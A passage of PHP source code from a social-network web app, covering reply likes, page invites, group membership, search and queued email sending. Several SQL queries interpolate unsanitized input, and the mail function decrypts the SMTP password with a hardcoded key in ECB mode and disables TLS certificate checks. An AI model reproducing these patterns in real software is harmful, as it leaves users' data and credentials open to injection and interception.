        return false;
    }
    $comment_id    = NRG_Secure($comment_id);
    $user_id       = NRG_Secure($user_id);
    $query_one     = "SELECT `id` FROM " . T_COMMENTS . " WHERE `id` = {$comment_id} AND `user_id` = {$user_id}";
    $sql_query_one = mysqli_query($sqlConnect, $query_one);
    if (mysqli_num_rows($sql_query_one) >= 1) {
        return true;
    }
}
function NRG_GetRepliedUsers($comment_id) {
    global $sqlConnect, $nrg;
    $data = array();
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (empty($comment_id) || !is_numeric($comment_id) || $comment_id < 1) {
        return false;
    }
    $query = mysqli_query($sqlConnect, "SELECT `user_id` FROM " . T_COMMENTS_REPLIES . " WHERE `comment_id` = {$comment_id}");
    if (mysqli_num_rows($query)) {
        while ($fetched_data = mysqli_fetch_assoc($query)) {
            $data[] = NRG_UserData($fetched_data["user_id"]);
        }
    }
    return $data;
}
function NRG_GetUserProfilePicture($image = "", $type = "") {
    global $sqlConnect, $nrg;
    if (empty($image)) {
        return false;
    }
    $explode2  = @end(explode(".", $image));
    $explode3  = @explode(".", $image);
    $image     = $explode3[0] . "_full." . $explode2;
    $query_one = "SELECT `post_id` FROM " . T_POSTS . " WHERE `postFile` = '{$image}'";
    $query     = mysqli_query($sqlConnect, $query_one);
    if (mysqli_num_rows($query) > 0) {
        $fetched_data = mysqli_fetch_assoc($query);
        return $fetched_data["post_id"];
    }
    return false;
}
function NRG_RegsiterRecent($id = 0, $type = "") {
    global $sqlConnect, $nrg;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (empty($id) || !is_numeric($id) || $id < 1) {
        return false;
    }
    if (empty($type)) {
        return false;
    }
    $id   = NRG_Secure($id);
    $type = NRG_Secure($type);
    if ($type == "timeline") {
        $type = "user";
    }
    $user_id      = NRG_Secure($nrg["user"]["user_id"]);
    $query_delete = mysqli_query($sqlConnect, "SELECT `id` FROM " . T_RECENT_SEARCHES . " WHERE `user_id` = {$user_id} AND `search_id` = '{$id}' AND `search_type` = '{$type}'");
    if (mysqli_num_rows($query_delete) > 0) {
        $query_two = mysqli_query($sqlConnect, "DELETE FROM " . T_RECENT_SEARCHES . " WHERE `user_id` = {$user_id} AND `search_id` = '{$id}' AND `search_type` = '{$type}'");
    }
    $query_one = mysqli_query($sqlConnect, "INSERT INTO " . T_RECENT_SEARCHES . " (`user_id`,`search_id`,`search_type`) VALUES ('{$user_id}', '{$id}', '{$type}')");
    if ($query_one) {
        return $id;
    }
}
function NRG_ClearRecent() {
    global $sqlConnect, $nrg;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    $user_id      = NRG_Secure($nrg["user"]["user_id"]);
    $query_delete = mysqli_query($sqlConnect, "SELECT `id` FROM " . T_RECENT_SEARCHES . " WHERE `user_id` = {$user_id}");
    if (mysqli_num_rows($query_delete) > 0) {
        $query_two = mysqli_query($sqlConnect, "DELETE FROM " . T_RECENT_SEARCHES . " WHERE `user_id` = {$user_id}");
        if ($query_two) {
            return true;
        }
    }
}
function NRG_GetSearchAdv($search_qeury, $type, $offset = 0, $limit = 0) {
    global $sqlConnect;
    $search_qeury = NRG_Secure($search_qeury);
    $data         = array();
    $offset_to    = "";
    if ($type == "groups") {
        if ($offset > 0) {
            $offset_to .= " AND `id` < {$offset} AND `id` <> {$offset} ";
        }
        $query = mysqli_query($sqlConnect, " SELECT `id` FROM " . T_GROUPS . " WHERE ((`group_name` LIKE '%$search_qeury%') OR `group_title` LIKE '%$search_qeury%') AND `active` = '1' {$offset_to} ORDER BY `id` DESC LIMIT 10");
        if (mysqli_num_rows($query)) {
            while ($fetched_data = mysqli_fetch_assoc($query)) {
                $data[] = NRG_GroupData($fetched_data["id"]);
            }
        }
    } elseif ($type == "pages") {
        if ($offset > 0) {
            $offset_to .= " AND `page_id` < {$offset} AND `page_id` <> {$offset} ";
        }
        $query = mysqli_query($sqlConnect, " SELECT `page_id` FROM " . T_PAGES . " WHERE ((`page_name` LIKE '%$search_qeury%') OR `page_title` LIKE '%$search_qeury%') AND `active` = '1' {$offset_to} ORDER BY `page_id` DESC LIMIT 10");
        if (mysqli_num_rows($query)) {
            while ($fetched_data = mysqli_fetch_assoc($query)) {
                $data[] = NRG_PageData($fetched_data["page_id"]);
            }
        }
    } elseif ($type == "games") {
        $limit_ = 10;
        if (!empty($limit)) {
            $limit_ = NRG_Secure($limit);
        }
        if ($offset > 0) {
            $offset_to .= " AND `id` < {$offset} AND `id` <> {$offset} ";
        }
        $query = mysqli_query($sqlConnect, " SELECT `id` FROM " . T_GAMES . " WHERE `game_name` LIKE '%$search_qeury%' AND `active` = '1' {$offset_to} ORDER BY `id` DESC LIMIT $limit_");
        if (mysqli_num_rows($query)) {
            while ($fetched_data = mysqli_fetch_assoc($query)) {
                $data[] = NRG_GameData($fetched_data["id"]);
            }
        }
    } elseif ($type == "posts") {
        $query = mysqli_query($sqlConnect, " SELECT `id` FROM " . T_POSTS . " WHERE `postText` LIKE '%$search_qeury%' ORDER BY `id` DESC LIMIT 10");
        if (mysqli_num_rows($query)) {
            while ($fetched_data = mysqli_fetch_assoc($query)) {
                $data[] = NRG_PostData($fetched_data["id"]);
            }
        }
    }
    return $data;
}
function NRG_GetUserAlbums($user_id, $placement = "", $limit = 5000, $offset = 0) {
    global $sqlConnect, $nrg;
    $data         = array();
    $user_id      = NRG_Secure($user_id);
    $offset_query = "";
    if (!empty($offset)) {
        $offset       = NRG_Secure($offset);
        $offset_query = " AND `id` < $offset ";
    }
    $query = mysqli_query($sqlConnect, " SELECT `id` FROM " . T_POSTS . " WHERE `album_name` <> '' AND `user_id` = {$user_id} $offset_query ORDER BY `id` DESC LIMIT {$limit}");
    if (mysqli_num_rows($query)) {
        while ($fetched_data = mysqli_fetch_assoc($query)) {
            $fetched_data = NRG_PostData($fetched_data["id"]);
            if (!empty($fetched_data["photo_album"])) {
                foreach ($fetched_data["photo_album"] as $id => $photo) {
                    $album = NRG_GetMedia($photo["image_org"]);
                }
                $fetched_data["first_image"] = $album;
                $data[]                      = $fetched_data;
            }
        }
    }
    return $data;
}
function NRG_AddCommentReplyWonders($reply_id, $text = "") {
    global $nrg, $sqlConnect;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (!isset($reply_id) or empty($reply_id) or !is_numeric($reply_id) or $reply_id < 1) {
        return false;
    }
    $reply_id        = NRG_Secure($reply_id);
    $user_id         = NRG_Secure($nrg["user"]["user_id"]);
    $comment_user_id = NRG_GetUserIdFromReplyId($reply_id);
    $comment         = NRG_GetCommentIdFromReplyId($reply_id);
    $post_id         = NRG_GetPostIdFromCommentId($comment);
    $page_id         = "";
    $post_data       = NRG_PostData($post_id);
    if (!empty($post_data["page_id"])) {
        $page_id = $post_data["page_id"];
    }
    if (NRG_IsPageOnwer($post_data["page_id"]) === false) {
        $page_id = 0;
    }
    if (empty($comment_user_id)) {
        return false;
    }
    $reply_data = NRG_GetCommentReply($reply_id);
    $text       = NRG_Secure($reply_data["text"]);
    if (isset($text) && !empty($text)) {
        $text = mb_substr($text, 0, 10, "UTF-8") . "..";
    }
    if (NRG_IsCommentReplyWondered($reply_id, $nrg["user"]["user_id"]) === true) {
        $query_one = "DELETE FROM " . T_COMMENT_REPLIES_WONDERS . " WHERE `reply_id` = {$reply_id} AND `user_id` = {$user_id}";
        mysqli_query($sqlConnect, "DELETE FROM " . T_NOTIFICATION . " WHERE `post_id` = {$post_id} AND `recipient_id` = {$comment_user_id} AND `type` = 'wondered_reply_comment'");
        $sql_query_one = mysqli_query($sqlConnect, $query_one);
        if ($sql_query_one) {
            return "unwonder";
        }
    } else {
        if ($nrg["config"]["second_post_button"] == "dislike" && NRG_IsCommentReplyLiked($reply_id, $nrg["user"]["user_id"])) {
            NRG_AddCommentReplyLikes($reply_id);
        }
        $query_two     = "INSERT INTO " . T_COMMENT_REPLIES_WONDERS . " (`user_id`, `reply_id`) VALUES ({$user_id}, {$reply_id})";
        $sql_query_two = mysqli_query($sqlConnect, $query_two);
        if ($sql_query_two) {
            $notification_data_array = array(
                "recipient_id" => $comment_user_id,
                "post_id" => $post_id,
                "type" => "wondered_reply_comment",
                "text" => $text,
                "page_id" => $page_id,
                "url" => "index.php?link1=post&id=" . $post_id . "&ref=" . $comment
            );
            NRG_RegisterNotification($notification_data_array);
            return "wonder";
        }
    }
}
function NRG_CountCommentReplyWonders($reply_id) {
    global $sqlConnect;
    if (empty($reply_id) or !is_numeric($reply_id) or $reply_id < 1) {
        return false;
    }
    $reply_id      = NRG_Secure($reply_id);
    $query_one     = "SELECT COUNT(`id`) AS `likes` FROM " . T_COMMENT_REPLIES_WONDERS . " WHERE `reply_id` = {$reply_id}";
    $sql_query_one = mysqli_query($sqlConnect, $query_one);
    if (mysqli_num_rows($sql_query_one) == 1) {
        $sql_fetch_one = mysqli_fetch_assoc($sql_query_one);
        return $sql_fetch_one["likes"];
    }
    return false;
}
function NRG_IsCommentReplyWondered($reply_id, $user_id) {
    global $sqlConnect;
    if (empty($reply_id) or !is_numeric($reply_id) or $reply_id < 1) {
        return false;
    }
    if (empty($user_id) or !is_numeric($user_id) or $user_id < 1) {
        return false;
    }
    $reply_id      = NRG_Secure($reply_id);
    $user_id       = NRG_Secure($user_id);
    $query_one     = "SELECT `id` FROM " . T_COMMENT_REPLIES_WONDERS . " WHERE `reply_id` = {$reply_id} AND `user_id` = {$user_id}";
    $sql_query_one = mysqli_query($sqlConnect, $query_one);
    if (mysqli_num_rows($sql_query_one) >= 1) {
        return true;
    }
}
function NRG_GetCommentIdFromReplyId($reply_id = 0) {
    global $sqlConnect;
    if (empty($reply_id) or !is_numeric($reply_id) or $reply_id < 1) {
        return false;
    }
    $reply_id      = NRG_Secure($reply_id);
    $query_one     = "SELECT `comment_id` FROM " . T_COMMENTS_REPLIES . " WHERE `id` = {$reply_id}";
    $sql_query_one = mysqli_query($sqlConnect, $query_one);
    if (mysqli_num_rows($sql_query_one) == 1) {
        $sql_fetch_one = mysqli_fetch_assoc($sql_query_one);
        return $sql_fetch_one["comment_id"];
    }
    return false;
}
function NRG_GetUserIdFromReplyId($reply_id = 0) {
    global $sqlConnect;
    if (empty($reply_id) or !is_numeric($reply_id) or $reply_id < 1) {
        return false;
    }
    $reply_id      = NRG_Secure($reply_id);
    $query_one     = "SELECT `user_id` FROM " . T_COMMENTS_REPLIES . " WHERE `id` = {$reply_id}";
    $sql_query_one = mysqli_query($sqlConnect, $query_one);
    if (mysqli_num_rows($sql_query_one) == 1) {
        $sql_fetch_one = mysqli_fetch_assoc($sql_query_one);
        return $sql_fetch_one["user_id"];
    }
}
function NRG_AddCommentReplyLikes($reply_id, $text = "") {
    global $nrg, $sqlConnect;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (!isset($reply_id) or empty($reply_id) or !is_numeric($reply_id) or $reply_id < 1) {
        return false;
    }
    $reply_id        = NRG_Secure($reply_id);
    $user_id         = NRG_Secure($nrg["user"]["user_id"]);
    $comment_user_id = NRG_GetUserIdFromReplyId($reply_id);
    $comment         = NRG_GetCommentIdFromReplyId($reply_id);
    $post_id         = NRG_GetPostIdFromCommentId($comment);
    $page_id         = "";
    $post_data       = NRG_PostData($post_id);
    if (!empty($post_data["page_id"])) {
        $page_id = $post_data["page_id"];
    }
    if (NRG_IsPageOnwer($post_data["page_id"]) === false) {
        $page_id = 0;
    }
    if (empty($comment_user_id)) {
        return false;
    }
    $reply_data = NRG_GetCommentReply($reply_id);
    $text       = NRG_Secure($reply_data["text"]);
    if (isset($text) && !empty($text)) {
        $text = mb_substr($text, 0, 10, "UTF-8") . "..";
    }
    if (NRG_IsCommentReplyLiked($reply_id, $user_id) === true) {
        $query_one = "DELETE FROM " . T_COMMENT_REPLIES_LIKES . " WHERE `reply_id` = {$reply_id} AND `user_id` = {$user_id}";
        mysqli_query($sqlConnect, "DELETE FROM " . T_NOTIFICATION . " WHERE `post_id` = {$post_id} AND `recipient_id` = {$comment_user_id} AND `type` = 'liked_reply_comment'");
        $sql_query_one = mysqli_query($sqlConnect, $query_one);
        if ($sql_query_one) {
            return "unliked";
        }
    } else {
        if ($nrg["config"]["second_post_button"] == "dislike" && NRG_IsCommentReplyWondered($reply_id, $nrg["user"]["user_id"])) {
            NRG_AddCommentReplyWonders($reply_id);
        }
        $query_two     = "INSERT INTO " . T_COMMENT_REPLIES_LIKES . " (`user_id`, `reply_id`) VALUES ({$user_id},{$reply_id})";
        $sql_query_two = mysqli_query($sqlConnect, $query_two);
        if ($sql_query_two) {
            $notification_data_array = array(
                "recipient_id" => $comment_user_id,
                "post_id" => $post_id,
                "type" => "liked_reply_comment",
                "text" => $text,
                "page_id" => $page_id,
                "url" => "index.php?link1=post&id=" . $post_id . "&ref=" . $comment
            );
            NRG_RegisterNotification($notification_data_array);
            return "liked";
        }
    }
}
function NRG_CountCommentReplyLikes($reply_id) {
    global $sqlConnect;
    if (empty($reply_id) or !is_numeric($reply_id) or $reply_id < 1) {
        return false;
    }
    $reply_id      = NRG_Secure($reply_id);
    $query_one     = "SELECT COUNT(`id`) AS `likes` FROM " . T_COMMENT_REPLIES_LIKES . " WHERE `reply_id` = {$reply_id}";
    $sql_query_one = mysqli_query($sqlConnect, $query_one);
    if (mysqli_num_rows($sql_query_one) == 1) {
        $sql_fetch_one = mysqli_fetch_assoc($sql_query_one);
        return $sql_fetch_one["likes"];
    }
    return false;
}
function NRG_IsCommentReplyLiked($reply_id, $user_id) {
    global $sqlConnect;
    if (empty($reply_id) or !is_numeric($reply_id) or $reply_id < 1) {
        return false;
    }
    if (empty($user_id) or !is_numeric($user_id) or $user_id < 1) {
        return false;
    }
    $reply_id      = NRG_Secure($reply_id);
    $user_id       = NRG_Secure($user_id);
    $query_one     = "SELECT `id` FROM " . T_COMMENT_REPLIES_LIKES . " WHERE `reply_id` = {$reply_id} AND `user_id` = {$user_id}";
    $sql_query_one = mysqli_query($sqlConnect, $query_one);
    if (mysqli_num_rows($sql_query_one) >= 1) {
        return true;
    }
}
function NRG_CanSeeBirthday($user_id, $privacy) {
    global $sqlConnect, $nrg;
    if (empty($user_id) || !is_numeric($user_id)) {
        return false;
    }
    if ($privacy == 0) {
        return true;
    } elseif ($privacy == 1) {
        if ($nrg["loggedin"] !== false) {
            if (NRG_IsFollowing($nrg["user"]["user_id"], $user_id) === true) {
                return true;
            }
        } else {
            return false;
        }
    } elseif ($privacy == 2) {
        return false;
    }
}
function NRG_CountPageInvites($page_id) {
    global $sqlConnect, $nrg;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (empty($page_id) || !is_numeric($page_id)) {
        return false;
    }
    $page_id   = NRG_Secure($page_id);
    $user_id   = NRG_Secure($nrg["user"]["user_id"]);
    $query_one = mysqli_query($sqlConnect, "SELECT COUNT(`id`) as count FROM " . T_FOLLOWERS . " WHERE `follower_id` = {$user_id} AND `active` = '1' AND `following_id` NOT IN (SELECT `invited_id` FROM " . T_PAGES_INVAITES . " WHERE `page_id` = {$page_id}) AND `following_id` NOT IN (SELECT `user_id` FROM " . T_PAGES_LIKES . " WHERE `page_id` = {$page_id})");
    if (mysqli_num_rows($query_one)) {
        $fetched_data = mysqli_fetch_assoc($query_one);
        return $fetched_data["count"];
    }
    return false;
}
function NRG_GetPageInvites($page_id) {
    global $sqlConnect, $nrg;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (empty($page_id) || !is_numeric($page_id)) {
        return false;
    }
    $data      = array();
    $page_id   = NRG_Secure($page_id);
    $user_id   = NRG_Secure($nrg["user"]["user_id"]);
    $query_one = mysqli_query($sqlConnect, "SELECT `following_id` FROM " . T_FOLLOWERS . " WHERE `follower_id` = {$user_id} AND `active` = '1' AND `following_id` NOT IN (SELECT `invited_id` FROM " . T_PAGES_INVAITES . " WHERE `page_id` = {$page_id}) AND `following_id` NOT IN (SELECT `user_id` FROM " . T_PAGES_LIKES . " WHERE `page_id` = {$page_id}) AND `following_id` NOT IN (SELECT `user_id` FROM " . T_PAGES . " WHERE `page_id` = {$page_id})");
    if (mysqli_num_rows($query_one)) {
        while ($fetched_data = mysqli_fetch_assoc($query_one)) {
            $data[] = NRG_UserData($fetched_data["following_id"]);
        }
    }
    return $data;
}
function NRG_RegsiterInvite($user_id, $page_id) {
    global $sqlConnect, $nrg;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (empty($user_id) || !is_numeric($user_id)) {
        return false;
    }
    if (empty($page_id) || !is_numeric($page_id)) {
        return false;
    }
    if (NRG_IsPageInvited($user_id, $page_id) === true) {
        return false;
    }
    if (NRG_PageExistsByID($page_id) === false) {
        return false;
    }
    $page_id        = NRG_Secure($page_id);
    $logged_user_id = NRG_Secure($nrg["user"]["user_id"]);
    $query_one      = mysqli_query($sqlConnect, "INSERT INTO " . T_PAGES_INVAITES . " (`invited_id`,`inviter_id`,`page_id`) VALUES ({$user_id}, {$logged_user_id}, {$page_id})");
    if ($query_one) {
        $page                    = NRG_PageData($page_id);
        $notification_data_array = array(
            "recipient_id" => $user_id,
            "type" => "invited_page",
            "page_id" => $page_id,
            "url" => "index.php?link1=timeline&u=" . $page["page_name"]
        );
        NRG_RegisterNotification($notification_data_array);
        return true;
    }
}
function NRG_IsPageInvited($user_id, $page_id) {
    global $sqlConnect, $nrg;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (empty($user_id) || !is_numeric($user_id)) {
        return false;
    }
    if (empty($page_id) || !is_numeric($page_id)) {
        return false;
    }
    $page_id        = NRG_Secure($page_id);
    $user_id        = NRG_Secure($user_id);
    $logged_user_id = NRG_Secure($nrg["user"]["user_id"]);
    $query_one      = mysqli_query($sqlConnect, "SELECT `id` FROM " . T_PAGES_INVAITES . " WHERE `invited_id` = {$user_id} AND `page_id` = {$page_id}");
    $fetched_data   = mysqli_num_rows($query_one);
    if ($fetched_data > 0) {
        return true;
    }
}
function NRG_GetPageInviters($user_id, $page_id) {
    global $sqlConnect, $nrg;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (empty($user_id) || !is_numeric($user_id)) {
        return false;
    }
    if (empty($page_id) || !is_numeric($page_id)) {
        return false;
    }
    $data      = array();
    $page_id   = NRG_Secure($page_id);
    $query_one = mysqli_query($sqlConnect, "SELECT `inviter_id` FROM " . T_PAGES_INVAITES . " WHERE `invited_id` = {$user_id} AND `page_id` = {$page_id}");
    if (mysqli_num_rows($query_one)) {
        while ($fetched_data = mysqli_fetch_assoc($query_one)) {
            $data[] = NRG_UserData($fetched_data["inviter_id"]);
        }
    }
    return $data;
}
function NRG_GetUserInviters($user_id, $limit = 20, $offset = 0) {
    global $sqlConnect, $nrg;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (empty($user_id) || !is_numeric($user_id)) {
        return false;
    }
    $data        = array();
    $page_id     = NRG_Secure($page_id);
    $limit       = !empty($limit) && is_numeric($limit) && $limit > 0 ? NRG_Secure($limit) : 20;
    $offset_text = "";
    if (!empty($offset) && is_numeric($offset) && $offset > 0) {
        $offset      = NRG_Secure($offset);
        $offset_text = " AND `id` < " . $offset;
    }
    $query_one = mysqli_query($sqlConnect, "SELECT * FROM " . T_PAGES_INVAITES . " WHERE `invited_id` = {$user_id} {$offset_text} LIMIT {$limit}");
    if (mysqli_num_rows($query_one)) {
        while ($fetched_data = mysqli_fetch_assoc($query_one)) {
            $page               = NRG_PageData($fetched_data["page_id"]);
            $page["invited_id"] = $fetched_data["id"];
            $data[]             = $page;
        }
    }
    return $data;
}
function NRG_DeleteInvites($user_id, $page_id) {
    global $sqlConnect, $nrg;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (empty($user_id) || !is_numeric($user_id)) {
        return false;
    }
    if (empty($page_id) || !is_numeric($page_id)) {
        return false;
    }
    $page_id   = NRG_Secure($page_id);
    $user_id   = NRG_Secure($user_id);
    $query_one = mysqli_query($sqlConnect, "DELETE FROM " . T_PAGES_INVAITES . " WHERE `invited_id` = {$user_id} AND `page_id` = {$page_id}");
    if ($query_one) {
        return true;
    }
}
function NRG_GetCallInAction($id, $url) {
    global $sqlConnect, $nrg;
    if (empty($id)) {
        return false;
    }
    if (!array_key_exists($id, $nrg["call_action"])) {
        return false;
    }
    if (empty($url)) {
        return false;
    }
    $nrg["call_page"]["call_action_url"] = $url;
    $nrg["call_page"]["call_action_btn"] = $nrg["call_action"][$id];
    return NRG_LoadPage("buttons/call-action");
}
function NRG_CountUserData($type) {
    global $nrg, $sqlConnect;
    $type_table = T_USERS;
    $type_id    = "user_id";
    $where      = "";
    if (in_array($type, array_keys($nrg["genders"]))) {
        $where = "`gender` = '" . $type . "'";
    } elseif ($type == "active") {
        $where = "`active` = '1'";
    } elseif ($type == "not_active") {
        $where = "`active` <> '1'";
    }
    $query_one = mysqli_query($sqlConnect, "SELECT COUNT($type_id) as count FROM {$type_table} WHERE {$where}");
    if (mysqli_num_rows($query_one)) {
        $fetched_data = mysqli_fetch_assoc($query_one);
        return $fetched_data["count"];
    }
    return false;
}
function NRG_CountPageData($type) {
    global $nrg, $sqlConnect;
    $type_table = T_PAGES;
    $type_id    = "id";
    $where      = "";
    if ($type == "likes") {
        $type_table = T_PAGES_LIKES;
        $where      = "`active` = '1'";
        $type_id    = "id";
    } elseif ($type == "pages_posts") {
        $type_table = T_POSTS;
        $where      = "`page_id` <> 0";
        $type_id    = "id";
    } elseif ($type == "verified_pages") {
        $type_table = T_PAGES;
        $where      = "`verified` = '1'";
        $type_id    = "page_id";
    }
    $query_one = mysqli_query($sqlConnect, "SELECT COUNT($type_id) as count FROM {$type_table} WHERE {$where}");
    if (mysqli_num_rows($query_one)) {
        $fetched_data = mysqli_fetch_assoc($query_one);
        return $fetched_data["count"];
    }
    return false;
}
function NRG_CountGroupData($type) {
    global $nrg, $sqlConnect;
    $type_table = T_PAGES;
    $type_id    = "id";
    $where      = "";
    if ($type == "members") {
        $type_table = T_GROUP_MEMBERS;
        $where      = "`active` = '1'";
        $type_id    = "id";
    } elseif ($type == "groups_posts") {
        $type_table = T_POSTS;
        $where      = "`group_id` <> 0";
        $type_id    = "id";
    } elseif ($type == "join_requests") {
        $type_table = T_GROUP_MEMBERS;
        $where      = "`active` = '0'";
        $type_id    = "id";
    }
    $query_one = mysqli_query($sqlConnect, "SELECT COUNT($type_id) as count FROM {$type_table} WHERE {$where}");
    if (mysqli_num_rows($query_one)) {
        $fetched_data = mysqli_fetch_assoc($query_one);
        return $fetched_data["count"];
    }
    return false;
}
function NRG_CountPostData($type) {
    global $nrg, $sqlConnect;
    $type_table = T_PAGES;
    $type_id    = "id";
    $where      = "";
    if ($type == "replies") {
        $type_table = T_COMMENTS_REPLIES;
        $type_id    = "id";
    } elseif ($type == "likes") {
        $type_table = T_LIKES;
        $type_id    = "id";
    } elseif ($type == "wonders") {
        $type_table = T_WONDERS;
        $type_id    = "id";
    }
    $query_one = mysqli_query($sqlConnect, "SELECT COUNT($type_id) as count FROM {$type_table}");
    if (mysqli_num_rows($query_one)) {
        $fetched_data = mysqli_fetch_assoc($query_one);
        return $fetched_data["count"];
    }
}
function NRG_CountGroupsNotMember($group_id) {
    global $sqlConnect, $nrg;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (empty($group_id) || !is_numeric($group_id)) {
        return false;
    }
    $user_id   = NRG_Secure($nrg["user"]["user_id"]);
    $group_id  = NRG_Secure($group_id);
    $query_one = mysqli_query($sqlConnect, "SELECT COUNT(`id`) as count FROM " . T_FOLLOWERS . " WHERE `follower_id` = {$user_id} AND `active` = '1' AND `following_id` NOT IN (SELECT `user_id` FROM " . T_GROUP_MEMBERS . " WHERE `group_id` = {$group_id})");
    if (mysqli_num_rows($query_one)) {
        $fetched_data = mysqli_fetch_assoc($query_one);
        return $fetched_data["count"];
    }
    return false;
}
function NRG_GetGroupsNotMember($group_id) {
    global $sqlConnect, $nrg;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (empty($group_id) || !is_numeric($group_id)) {
        return false;
    }
    $data      = array();
    $group_id  = NRG_Secure($group_id);
    $user_id   = NRG_Secure($nrg["user"]["user_id"]);
    $query_one = mysqli_query($sqlConnect, "SELECT `following_id` FROM " . T_FOLLOWERS . " WHERE `follower_id` = {$user_id} AND `active` = '1' AND `following_id` NOT IN (SELECT `user_id` FROM " . T_GROUP_MEMBERS . " WHERE `group_id` = {$group_id})");
    if (mysqli_num_rows($query_one)) {
        while ($fetched_data = mysqli_fetch_assoc($query_one)) {
            $data[] = NRG_UserData($fetched_data["following_id"]);
        }
    }
    return $data;
}
function NRG_GroupExistsByID($id) {
    global $sqlConnect;
    if (empty($id)) {
        return false;
    }
    $id    = NRG_Secure($id);
    $query = mysqli_query($sqlConnect, "SELECT COUNT(`id`) FROM " . T_GROUPS . " WHERE `id`= '{$id}' AND `active` = '1'");
    return NRG_Sql_Result($query, 0) == 1 ? true : false;
}
function NRG_UserExistsById($id) {
    global $sqlConnect;
    if (empty($id)) {
        return false;
    }
    $id    = NRG_Secure($id);
    $query = mysqli_query($sqlConnect, "SELECT COUNT(`user_id`) FROM " . T_USERS . " WHERE `user_id`= '{$id}' AND `active` = '1'");
    return NRG_Sql_Result($query, 0) == 1 ? true : false;
}
function NRG_RegsiterGroupAdd($user_id, $group_id) {
    global $sqlConnect, $nrg;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (empty($user_id) || !is_numeric($user_id)) {
        return false;
    }
    if (empty($group_id) || !is_numeric($group_id)) {
        return false;
    }
    if (NRG_IsGroupJoined($group_id, $user_id) === true) {
        return false;
    }
    if (NRG_GroupExistsByID($group_id) === false) {
        return false;
    }
    if (NRG_UserExistsById($user_id) === false) {
        return false;
    }
    if (NRG_IsGroupOnwer($group_id, $user_id)) {
        return false;
    }
    $logged_user_id = NRG_Secure($nrg["user"]["user_id"]);
    $group_data     = NRG_GroupData($group_id);
    $user_id        = NRG_Secure($user_id);
    $query_one      = mysqli_query($sqlConnect, " INSERT INTO " . T_GROUP_MEMBERS . " (`user_id`,`group_id`,`active`,`time`) VALUES ({$user_id},{$group_id},'1'," . time() . ")");
    if ($query_one) {
        $notification_data_array = array(
            "recipient_id" => $user_id,
            "type" => "added_you_to_group",
            "group_id" => $group_id,
            "url" => "index.php?link1=timeline&u=" . $group_data["group_name"]
        );
        NRG_RegisterNotification($notification_data_array);
        return true;
    }
}
function NRG_GetFemusUsers() {
    global $nrg, $sqlConnect;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    $data      = array();
    $time      = time() - 86400;
    $user_id   = NRG_Secure($nrg["user"]["user_id"]);
    // $query_one = " SELECT `user_id` FROM " . T_USERS . " WHERE (`verified` = '1' OR `admin` = '1' OR `active` = '1') AND `user_id` <> '{$user_id}' AND `active` = '1' AND `user_id` NOT IN (SELECT `following_id` FROM " . T_FOLLOWERS . " WHERE `follower_id` = {$user_id} AND `following_id` <> {$user_id} AND `active` = '1') AND `avatar` <> '" . $nrg['userDefaultAvatar'] . "' AND `lastseen` >= {$time} ORDER BY RAND() LIMIT 20 ";
    $query_one = " SELECT `user_id` FROM " . T_USERS . " WHERE (`verified` = '1' OR `admin` = '1' OR `active` = '1') AND follow_privacy = '0' AND `user_id` <> '{$user_id}' AND `active` = '1' AND `user_id` NOT IN (SELECT `following_id` FROM " . T_FOLLOWERS . " WHERE `follower_id` = {$user_id} AND `following_id` <> {$user_id} AND `active` = '1') AND `avatar` <> '" . $nrg["userDefaultAvatar"] . "' AND `lastseen` >= {$time} ORDER BY RAND() LIMIT 20 ";
    $sql       = mysqli_query($sqlConnect, $query_one);
    if (mysqli_num_rows($sql)) {
        while ($fetched_data = mysqli_fetch_assoc($sql)) {
            $user_data = NRG_UserData($fetched_data["user_id"]);
            $data[]    = $user_data;
        }
    }
    return $data;
}
function NRG_CanSenEmails() {
    global $nrg;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if ($nrg["config"]["smtp_or_mail"] == "mail") {
        return false;
    }
    $can_send_time = time() - 180;
    if ($nrg["user"]["last_email_sent"] > $can_send_time) {
        return false;
    }
    return true;
}
function NRG_SendMessageFromDB() {
    global $nrg, $sqlConnect;
    include_once "assets/libraries/PHPMailer-Master/vendor/autoload.php";
    $mail = new PHPMailer\PHPMailer\PHPMailer();
    if ($nrg["loggedin"] == false) {
        return false;
    }
    $data = array();
    if (NRG_CanSenEmails() === false) {
        return false;
    }
    $user_id   = NRG_Secure($nrg["user"]["user_id"]);
    $query_one = " SELECT * FROM " . T_EMAILS . " WHERE `user_id` = {$user_id} ORDER BY `id` DESC";
    $sql       = mysqli_query($sqlConnect, $query_one);
    if (mysqli_num_rows($sql) < 1) {
        return false;
    }
    if ($nrg["config"]["smtp_or_mail"] == "mail") {
        $mail->IsMail();
    } elseif ($nrg["config"]["smtp_or_mail"] == "smtp") {
        $mail->isSMTP();
        $mail->Host          = $nrg["config"]["smtp_host"]; // Specify main and backup SMTP servers
        $mail->SMTPAuth      = true;
        $mail->SMTPKeepAlive = true;
        $mail->Username      = $nrg["config"]["smtp_username"]; // SMTP username
        $mail->Password      = openssl_decrypt($nrg["config"]["smtp_password"], "AES-128-ECB", "mysecretkey1234"); // SMTP password
        $mail->SMTPSecure    = $nrg["config"]["smtp_encryption"]; // Enable TLS encryption, `ssl` also accepted
        $mail->Port          = $nrg["config"]["smtp_port"];
        $mail->SMTPOptions   = array(
            "ssl" => array(
                "verify_peer" => false,
                "verify_peer_name" => false,
                "allow_self_signed" => true
            )
        );
    } else {
        return false;
    }
    $mail->setFrom($nrg["config"]["siteEmail"], $nrg["config"]["siteName"]);
    $send          = false;
    $mail->CharSet = "utf-8";
    if (mysqli_num_rows($sql)) {
        while ($fetched_data = mysqli_fetch_assoc($sql)) {
            $mail->addAddress($fetched_data["email_to"]);
            $mail->Subject = $fetched_data["subject"];
